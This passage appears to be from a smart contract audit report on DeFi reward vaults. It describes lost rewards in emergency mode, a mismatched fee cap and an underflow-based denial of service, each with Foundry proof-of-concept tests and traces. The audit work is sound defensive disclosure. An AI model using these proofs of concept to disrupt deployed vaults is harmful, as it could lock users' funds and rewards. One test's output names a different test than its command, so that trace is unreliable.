When `VaultFactory::setEmergencyMode` is called, it triggers the following behavior in `BaseVault`:

```
File: BaseVault.sol742:     function setEmergencyMode() public virtual override onlyFactory nonReentrant {743:         // Withdraw all tokens from the strategy.744:         _strategy.withdrawAll();745: 746:         // signal vault emergency mode before unsetting strategy747:         _beforeEmergencyMode();748: 749:         // Sets the strategy to the zero address, this will prevent any deposits.750:         _setStrategy(IStrategy(address(0)));751: 752:         emit EmergencyMode();753:     }
```

This prevents deposits and disables reward harvesting, as `_harvest()` in `OracleRewardVault` returns early when no strategy exists:

```
File: OracleRewardVault.sol226:     function _harvest(address user) internal {227:         if (address(getStrategy()) == address(0)) {228:             return;229:         }230:
```

However, `_harvest()` is also used inside `_modifyUser()`, which is called during transfers. Even though reward harvesting is skipped in emergency mode, the vault **still updates reward accounting** via `_updateUserDebt()`:

```
function _updateUserDebt(User storage userData) internal {        userData.rewardDebt = (userData.amount * _accRewardsPerShare).unshiftPrecision(); // / PRECISION;        userData.extraRewardDebt = (userData.amount * _extraRewardsPerShare).unshiftPrecision(); // / PRECISION;    }
```

This causes `rewardDebt` and `extraRewardDebt` to be updated incorrectly **without rewards being harvested**, leading to the loss of claimable rewards.

The loss of rewrads apply also for users have pending rewards and emergency mode is activated.

### Impact Explanation

- Users unknowingly forfeit their pending rewards by calling `transfer()` after emergency mode is activated.
- Users who have not claimed their rewards before emergency mode is activated **permanently lose access** to those rewards.

### Likelihood Explanation

low there is a flag before emergency mode is activated so its a low likelihood for a user to either claim or transfer after emergency mode is activated

### Proof of Concept

- Add this test in `OracleRewardVaultTest` contract in `OracleRewardVault.t.sol` file
- run this command to execute the tests `forge test --mt testDepositRebalanceWithdrawWrongdeBttraking -vvvv`

```
function testDepositRebalanceWithdrawWrongdeBttraking() public {        // increase oracle so we can do a twap price check        (, uint256 oracleLength, , , ) = ILBPair(IOTA_USDC_E_PAIR).getOracleParameters();        if (oracleLength < 3) {            ILBPair(IOTA_USDC_E_PAIR).increaseOracleLength(3);        }
        skip(2 minutes);
        hoax(max, 75 ether);        (address vault, address strategy) =            _factory.createMarketMakerOracleVault{value: 75 ether}(ILBPair(IOTA_USDC_E_PAIR), 0.1e4);
        OracleRewardVault rewardVault = OracleRewardVault(payable(vault));
        IERC20Upgradeable tokenX = rewardVault.getTokenX();        IERC20Upgradeable tokenY = rewardVault.getTokenY();
        uint256 amountX = 10 * 10 ** IERC20MetadataUpgradeable(address(tokenX)).decimals(); // wnative        uint256 amountY = 0;
        // bob deposits        deal(bob, amountX); // deal with erc20 is not working on iota evm
        vm.startPrank(bob);        IWNative(WNATIVE).deposit{value: amountX}();
        tokenX.approve(vault, amountX);        (uint256 shares,,) = rewardVault.deposit(amountX, amountY, 0);        vm.stopPrank();
        console.log("::1 shares");        (uint256 pending,) = rewardVault.getPendingRewards(bob);        assertEq(0, pending, "::1 pending rewards should be 0");
        // rebalance        _rebalanceSingleSide(max, IOTA_USDC_E_PAIR, strategy);
        // time travel        skip(10 minutes);
        // rebalance again, this will harvest rewards        _rebalanceSingleSide(max, IOTA_USDC_E_PAIR, strategy);
        console.log("::2");        (pending,) = rewardVault.getPendingRewards(bob);        assertGt(pending, 0, "::2 pending rewards should be greater than 0");
        deal(bob, amountX); // deal with erc20 is not working on iota evm        vm.startPrank(bob);        IWNative(WNATIVE).deposit{value: amountX}();
        tokenX.approve(vault, amountX);        (uint256 shares2,,) = rewardVault.deposit(amountX, amountY, 0);        vm.stopPrank();
        skip(10 minutes);        console.log("::3");        (pending,) = rewardVault.getPendingRewards(bob);
        assertEq(pending, 0, "::3 pending rewards should be than 0, we did harvest on deposit before");
        skip(10 minutes);        _rebalanceSingleSide(max, IOTA_USDC_E_PAIR, strategy);
        // getting alice and bob reward info        IOracleRewardVault.User memory bobDataBefore = rewardVault.getUserInfo(bob);        IOracleRewardVault.User memory aliceDataBefore = rewardVault.getUserInfo(alice);
        _factory.setEmergencyMode(rewardVault);
        vm.prank(bob);        IERC20Upgradeable(vault).transfer(alice, shares);
        // getting reward info after transfer        IOracleRewardVault.User memory bobDataAfter = rewardVault.getUserInfo(bob);        IOracleRewardVault.User memory aliceDataAfter = rewardVault.getUserInfo(alice);
        // both users has change in their rewards without cliaming any        assertGt(bobDataBefore.rewardDebt, bobDataAfter.rewardDebt, "bob rewards debt shouldn't decrease as he didn't collect rewards");        assertGt(aliceDataAfter.rewardDebt, aliceDataBefore.rewardDebt, "alice rewards debt shouldn't shouldn't change as she didn't collect rewards");
    }
```

Expected output: increase in users rewardsDebt without increasing of their balance

```
├─ [1308] 0x24F66E4d5c6227bd83C693Fa462f4b654Aa4577d::getUserInfo(bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e]) [staticcall]    │   ├─ [1096] OracleRewardVault::getUserInfo(bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e]) [delegatecall]    │   │   └─ ← [Return] User({ amount: 1472950000328 [1.472e12], rewardDebt: 305181325846158 [3.051e14], extraRewardDebt: 0 })    │   └─ ← [Return] User({ amount: 1472950000328 [1.472e12], rewardDebt: 305181325846158 [3.051e14], extraRewardDebt: 0 })    ├─ [1308] 0x24F66E4d5c6227bd83C693Fa462f4b654Aa4577d::getUserInfo(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6]) [staticcall]    │   ├─ [1096] OracleRewardVault::getUserInfo(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6]) [delegatecall]    │   │   └─ ← [Return] User({ amount: 1472927000000 [1.472e12], rewardDebt: 305176560395468 [3.051e14], extraRewardDebt: 0 })    │   └─ ← [Return] User({ amount: 1472927000000 [1.472e12], rewardDebt: 305176560395468 [3.051e14], extraRewardDebt: 0 })    └─ ← [Stop]
```

### Recommendation

one solution is

- Store `rewardtoken` and `extrarewradtoken` in state variable so in emergency users can get their rewards normally


## [M-05] discrepancy of max aum fee in VaultFactory and strategy leads to unnecessary reverts

### Summary

`MAX_AUM_FEE` in VaultFactory is constant and set to `0.3e4` but in strategy set to `0.25e4`

### Finding Description

`MAX_AUM_FEE` in VaultFactory is different than it is in `Strategy` making users trying to set fees in range `0.25e4` to `0.3e4` revert which should be allowed

### Impact Explanation

medium: broken `createMarketMakerOracleVault` function that will keep reverting in-case setting fees in range 0.25e4 to 0.3e4

- user lose potential fees as he is expected to set up-to 30% but capped at 25%

### Proof of Concept

Add this test in `OracleRewardVaultTest` contract in `OracleRewardVault.t.sol` file

run this command `forge test --mc OracleRewardVaultTest --mt testCreateMarketMakerVaultRevert -vvvv`

```
function testCreateMarketMakerVaultRevert() public {
        vm.expectRevert(IStrategy.Strategy__InvalidFee.selector);        hoax(max, 75 ether);        (address vault, address strategy) =            _factory.createMarketMakerOracleVault{value: 75 ether}(ILBPair(IOTA_USDC_E_PAIR), 0.26e4);    }
```

expected output

```
│   │   ├─ [656] 0x72F1C4A99f7bBaBCCf95C962D1b269D2F6A13208::setPendingAumAnnualFee(2600)    │   │   │   ├─ [457] Strategy::setPendingAumAnnualFee(2600) [delegatecall]    │   │   │   │   └─ ← [Revert] Strategy__InvalidFee()    │   │   │   └─ ← [Revert] Strategy__InvalidFee()    │   │   └─ ← [Revert] Strategy__InvalidFee()    │   └─ ← [Revert] Strategy__InvalidFee()
```

transaction reverted due to invalid fee from strategy

### Recommendation

adjust the `_MAX_AUM_ANNUAL_FEE` in `strategy` to be the same as `MAX_AUM_FEE` in the `vaultFActory`

```
-- uint256 private constant _MAX_AUM_ANNUAL_FEE = 0.25e4; // 25%++ uint256 private constant _MAX_AUM_ANNUAL_FEE = 0.3e4; // 30%
```





## [I-01] Wrong tracking of lastRewardBalance in safeRewardTransfer will DOS the vault

### Summary

The `OracleRewardVault` contract suffers from broken reward accounting due to stale `_lastRewardBalance` and `_lastExtraRewardBalance` values. Under certain conditions, this can cause underflows in the `updatePool` function, effectively rendering the protocol unusable (Denial of Service).

### Finding Description

The contract tracks reward distribution using the following variables:

- `_lastRewardBalance` and `_accRewardsPerShare`
- `_lastExtraRewardBalance` and `_extraRewardsPerShare`

Rewards are updated through `updatePool()` and reduced during user claims via `_safeRewardTransfer`. When the vault lacks sufficient reward token balance, only the available balance is transferred, and that smaller amount is subtracted from `_lastRewardBalance` or `_lastExtraRewardBalance`.

```
File: OracleRewardVault.sol239:     function _safeRewardTransfer(IERC20 token, address to, uint256 amount, bool isExtra) internal {240:         if (amount == 0) return;241: 242:         uint256 balance = TokenHelper.safeBalanceOf(token, address(this));243: 244:         uint256 rewardPayout = amount;245: 246:         if (amount > balance) {247:             rewardPayout = balance;248:         }249: 250:         if (isExtra) {251:@>           _lastExtraRewardBalance = _lastExtraRewardBalance - rewardPayout;252:         } else {253:@>           _lastRewardBalance = _lastRewardBalance - rewardPayout;254:         }
```

So those values will grow big when balance is less than the needed rewards more over if balance reaches 0 and a lot of users call claim This leads to multiple impacts

1. If a user's pending rewards exceed the vault’s current reward token balance, the vault only pays out the available amount but subtracts that smaller amount from the `_lastRewardBalance` and `_lastExtraRewardBalance` which will DOS the protocol due to underflow in `updatepool` until the value of rewards exceed `_lastRewardBalance` and `_lastExtraRewardBalance` again

The different in vault balance and user rewards could happen naturally or from `recoverERC20` as it doesn't check whether the to be recovered token is a (`rewardToken` / `extraRewardToken`) or not

### Impact Explanation

Broken rewards accounting in the vault The vault will be DOSed due to underflow in `updatepool` as its used in all core functions such

- deposit
- withdraw
- claim
- transfer

```
File: OracleRewardVault.sol164:@>           uint256 lastExtraRewardBalance = _lastExtraRewardBalance;165: 166:             // recompute accRewardsPerShare if not up to date167:             if (lastExtraRewardBalance == extraRewardBalance || _shareTotalSupply == 0) {168:                 return;169:             }170: 171:@>           uint256 accruedExtraReward = extraRewardBalance - lastExtraRewardBalance;172:             uint256 calcAccExtraRewardsPerShare =173:                 accExtraRewardsPerShare + ((accruedExtraReward.shiftPrecision()) / _shareTotalSupply);174:
```

### Likelihood Explanation

Happens when the to be claimed amounts > vault balance

### Proof of Concept

Add this test in `oracleRewardVault.t.sol`

and run this command `forge test --mt testDOSedVaultWrongRewardTraking --via-ir -vvv`

```
function testDOSedVaultWrongRewardTraking() public {        ERC20Mock tokenX = new ERC20Mock("WIOTA", "WIOTA", 18);        ERC20Mock tokenY = new ERC20Mock("USDC", "USDC", 6);
        ILBPair pair = ILBPair(address(new LBPairMock(tokenX, tokenY)));
        ERC20Mock rewardToken = new ERC20Mock("LUM", "LUM", 18);        ERC20Mock extraRewardToken = new ERC20Mock("SEA", "SEA", 18);
        VaultFactory localFactory = VaultFactory(            address(                new TransparentUpgradeableProxy(                    address(new VaultFactory(address(tokenX))),                    address(1),                    abi.encodeWithSelector(VaultFactory.initialize2.selector, address(this))                )            )        );
        // whitelist pair        address[] memory pairs = new address[](1);        pairs[0] = address(pair);        localFactory.setPairWhitelist(pairs, true);
        OracleRewardVault oracleRewardVault = new OracleRewardVault(localFactory);        localFactory.setVaultImplementation(IVaultFactory.VaultType.Oracle, address(oracleRewardVault));
        localFactory.setStrategyImplementation(IVaultFactory.StrategyType.Default, address(new StrategyMock()));
        localFactory.setPriceLens(IPriceLens(new PriceLensMock()));        localFactory.setFeeRecipient(treasury);
        hoax(max, 75 ether);        (address vault, address strategy) = localFactory.createMarketMakerOracleVault{value: 75 ether}(pair, 0.1e4);
        // have to set it manuelly cause this is a clone        StrategyMock(strategy).setOperator(max);        StrategyMock(strategy).setRewardToken(rewardToken);        StrategyMock(strategy).setExtraRewardToken(extraRewardToken);        StrategyMock(strategy).setTokenX(tokenX);        StrategyMock(strategy).setTokenY(tokenY);
        OracleRewardVault rewardVault = OracleRewardVault(payable(vault));
        // disable twap price check        vm.prank(address(localFactory));        rewardVault.enableTWAPPriceCheck(false);
        // mint token mocking        tokenX.mint(bob, 10e18);        tokenY.mint(bob, 12e6);
        vm.startPrank(bob);        tokenX.approve(vault, 10e18);        tokenY.approve(vault, 12e6);
        (uint256 shares,,) = rewardVault.deposit(10e18, 12e6, 0);        vm.stopPrank();
        // mocking the harvest and add rewardtoken        rewardToken.mint(vault, 20e18);
        //bob pending rewards is now increased        (uint256 pending,) = rewardVault.getPendingRewards(bob);        console2.log("bob pending rewards:", pending);
        rewardToken.approve(vault,type(uint256).max);        address addressRecoverToken = address(rewardToken);        IERC20Upgradeable recoverToken = IERC20Upgradeable(addressRecoverToken); 
        vm.startPrank(bob);        IERC20Upgradeable(vault).transfer(alice, shares/2);        vm.stopPrank();
        localFactory.recoverERC20(IBaseVault(vault), recoverToken, alice, rewardToken.balanceOf(vault));//this call is to change the balance from the old one                vm.startPrank(bob);        vm.expectRevert();        rewardVault.claim();//when claim is called updatepool will be called which will revert due to underflow        vm.stopPrank();    }
```

expected Output: claim function revert due to underflow in `updatepool`

```
Ran 1 test for test/OracleRewardVault.t.sol:OracleRewardVaultTest[PASS] testRewardBrokenCalculatoins() (gas: 15216243)Logs:  bob pending rewards: 19999999999999999999
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.42s (1.66s CPU time)
```

### Recommendation

Instead of subtracting `rewardPayout` subtract `amount`

## [I-02] In emergency Mode there might be some left rewards in the rewarder that isn't claimed

### Summary

When emergency mode is triggered it doesn't check whether there is any rewards or not causing loss of rewards

### Finding Description

When emergency is activated it send all the funds from the strategy to the vault but don't consider whether there is still any rewards in rewarder or not meaning that there might be a loss of rewards

### Impact Explanation

potential loss of rewards

### Likelihood Explanation

Need emergency-mode to be activated

- although emergency should be executed after some alerts there is a chance that there is still some rewrads to be claimed from the rewarder

### Proof of Concept

add this in `OracleRewardVault.t.sol`

run the command `forge test --mt testLostRewardsEmergencyMode --via-ir -vvv`

```
function testLostRewardsEmergencyMode() public {        // increase oracle so we can do a twap price check        (, uint256 oracleLength, , , ) = ILBPair(IOTA_USDC_E_PAIR).getOracleParameters();        if (oracleLength < 3) {            ILBPair(IOTA_USDC_E_PAIR).increaseOracleLength(3);        }
        skip(2 minutes);
        hoax(max, 75 ether);        (address vault, address strategy) =            _factory.createMarketMakerOracleVault{value: 75 ether}(ILBPair(IOTA_USDC_E_PAIR), 0.1e4);
        OracleRewardVault rewardVault = OracleRewardVault(payable(vault));
        IERC20Upgradeable tokenX = rewardVault.getTokenX();        IERC20Upgradeable tokenY = rewardVault.getTokenY();
        uint256 amountX = 10 * 10 ** IERC20MetadataUpgradeable(address(tokenX)).decimals(); // wnative        uint256 amountY = 0;
        // bob deposits        deal(bob, amountX); // deal with erc20 is not working on iota evm
        vm.startPrank(bob);        IWNative(WNATIVE).deposit{value: amountX}();
        tokenX.approve(vault, amountX);        (uint256 shares,,) = rewardVault.deposit(amountX, amountY, 0);        vm.stopPrank();
        // rebalance        _rebalanceSingleSide(max, IOTA_USDC_E_PAIR, strategy);
        skip(10 minutes);        // there is rewards to be harvested but ingored in emergency        _factory.setEmergencyMode(IBaseVault(vault));
        //there is no rewards though it must have rewards        uint256 vaultBalance = TokenHelper.safeBalanceOf(IStrategy(strategy).getRewardToken(), vault);        console2.log("vault rewards", vaultBalance);
    }
```

Expected output Reward is 0 as its not harvested

```
[PASS] testLostRewardsEmergencyMode() (gas: 2526233)Logs:  vault rewards 0
```

### Recommendation

There might be left rewards at the time of setting emergencymode make sure its harvested